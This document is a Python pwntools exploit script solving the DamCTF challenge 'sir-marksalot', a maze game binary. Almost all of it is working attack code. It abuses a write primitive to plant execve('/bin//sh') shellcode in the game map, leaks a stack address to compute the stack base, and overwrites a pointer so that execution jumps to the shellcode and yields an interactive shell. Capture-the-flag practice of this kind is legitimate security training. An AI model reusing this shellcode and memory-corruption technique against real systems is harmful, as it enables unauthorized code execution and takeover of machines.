#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sir-marksalot
import subprocess

from pwn import log, args, remote, process, gdb, context, ELF, cyclic_gen, p64, u64
from pwn import *

HOST, PORT = "chals.damctf.xyz 31314".split()

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sir-marksalot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

directions = {
    "w": "North",
    "s": "South",
    "a": "West",
    "d": "East"
}

class Player(object):

    def __init__(self: object, x: int, y: int) -> None:
        self.x_coord = x
        self.y_coord = y

    def __str__(self: object) -> str:
        return f"x: {self.x_coord}, y: {self.y_coord}"


def read_map() -> Player:
    io.recvuntil(b"): ")
    io.sendline(b"m")
    map = []
    tmp_player = None
    for i in range(81):
        line = io.recvline()
        if b"*" in line:
            y = i // 2
            x = line.find(b"*") // 4
            tmp_player = Player(x, y)
        map.append(line)

    return tmp_player


def get_grue_position(x: int, y: int) -> Player:
    output = subprocess.check_output([
        "./generate_random",
        str(x),
        str(y),
        "GDB" if args.GDB else ""
    ]).decode().strip().split("\n")

    options = list()
    for option in output:
        y, x = option.split(",")
        x = int(x)
        y = int(y)
        options.append(Player(x, y))

    assert len(options) == 1
    return options[0]


def go(direction: str) -> bool:
    # log.info(f"Going {directions[direction]}")
    io.recvuntil(b"): ")
    io.sendline(direction.encode())
    res = io.recvline()
    if b"There's a wall there." in res:
        return False
    if b"You were eaten by a Grue." in res:
        log.info("Eaten by a Grue!")
    return True


def north() -> bool:
    res = go("w")
    if res:
        player.y_coord -= 1
    # log.info(f"Player position: {str(player)}")
    return res


def south() -> bool:
    res = go("s")
    if res:
        player.y_coord += 1
    # log.info(f"Player position: {str(player)}")
    return res


def west() -> bool:
    res = go("a")
    if res:
        player.x_coord -= 1
    # log.info(f"Player position: {str(player)}")
    return res


def east() -> bool:
    res = go("d")
    if res:
        player.x_coord += 1
    # log.info(f"Player position: {str(player)}")
    return res


def evil_north() -> bool:
    write(b"\x0f"*0x20)
    return north()


def evil_south() -> bool:
    write(b"\x0f"*0x20)
    return south()


def evil_west() -> bool:
    write(b"\x0f"*0x20)
    return west()


def evil_east() -> bool:
    write(b"\x0f"*0x20)
    return east()


def write(what: str) -> None:
    io.recvuntil(b"): ")
    io.sendline(b"x")
    io.recvuntil(b"write?")
    io.send(what.ljust(0x20, b"\x00"))


def set_position(x: int, y: int) -> None:
    global player
    x_foo = evil_east if x > player.x_coord else evil_west
    y_foo = evil_south if y > player.y_coord else evil_north

    while player.x_coord != x:
        x_foo()

    while player.y_coord != y:
        y_foo()

    log.success(f"Position set to: {x}, {y}")


io = start()

io.recvuntil(b"What would you like to do?")
io.sendline(b"jump up and down")

player = read_map()
log.success("Got player")
print(player)

log.info("Searching for probable random seed")
possible_position = get_grue_position(player.x_coord, player.y_coord)
print(possible_position)

set_position(0, 0)
evil_south()
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05".ljust(0x20, b"\x0f")
for i in range(40):
    evil_west()
for i in range(40):
    write(shellcode)
    res = east()
north()

set_position(2, 39)

curr_player = read_map()
assert (curr_player.x_coord, curr_player.y_coord) == (player.x_coord, player.y_coord)

xchg_eax_esp = exe.address + 0x0c41
pop_rdi = exe.address + 0x0b95

for _ in range(10):
    evil_west()
evil_south()
evil_south()
for _ in range(7):
    evil_west()
io.recvuntil(b"written: ")
leak = io.recvline().strip().ljust(8, b"\x00")
leak = u64(leak)
stack_base = leak - 0x209b9
_map = stack_base + 0x12010
log.info(f"Got stack base: {hex(stack_base)}")
log.info(f"shellcode should be at: {hex(_map)}")
for _ in range(17):
    evil_east()
evil_north()

write(cyclic_gen().get(8) + p64(_map) + b"\x0f"*0x10)
north()
set_position(possible_position.x_coord, possible_position.y_coord)

io.interactive()

